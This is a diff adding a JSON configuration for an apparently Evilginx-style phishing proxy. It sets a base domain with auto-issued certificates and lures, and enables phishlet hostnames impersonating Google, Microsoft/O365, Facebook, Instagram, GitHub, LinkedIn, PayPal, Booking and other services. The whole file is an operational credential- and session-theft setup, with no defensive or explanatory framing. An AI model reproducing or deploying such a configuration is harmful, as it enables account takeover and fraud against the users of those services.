@@ -1,0 +1,379 @@
+{
+  "blacklist": {
+    "mode": "unauth"
+  },
+  "general": {
+    "domain": "blackyou.dedyn.io",
+    "ipv4": "",
+    "external_ipv4": "127.0.0.1",
+    "bind_ipv4": "",
+    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    "https_port": 443,
+    "dns_port": 53,
+    "autocert": true
+  },
+  "lures": [
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "github",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "instagram",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "facebook",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "linkedin",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "reddit",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "o365",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "booking",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "o3652",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "microsoft",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "amazon",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "google",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "paypal",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "tiktok",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/",
+      "paused": 0,
+      "phishlet": "outlook",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    }
+  ],
+  "phishlets": {
+    "airbnb": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "amazon": {
+      "hostname": "az.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "booking": {
+      "hostname": "bk.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "cisco-vpn": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "citrix": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "coinbase": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "facebook": {
+      "hostname": "fb.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "github": {
+      "hostname": "gh.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "google": {
+      "hostname": "go.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "instagram": {
+      "hostname": "ig.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "knowbe4": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "linkedin": {
+      "hostname": "li.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "microsoft": {
+      "hostname": "live.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "o365": {
+      "hostname": "ms.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "o3652": {
+      "hostname": "ms2.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "okta": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "onelogin": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "outlook": {
+      "hostname": "tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "paypal": {
+      "hostname": "pp.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    },
+    "protonmail": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "reddit": {
+      "hostname": "rd.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "tiktok": {
+      "hostname": "rd.tsl2.blackyou.dedyn.io",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "twitter": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "twitter-mobile": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    },
+    "wordpress.org": {
+      "hostname": "",
+      "unauth_url": "",
+      "enabled": false,
+      "visible": true
+    }
+  }
+}
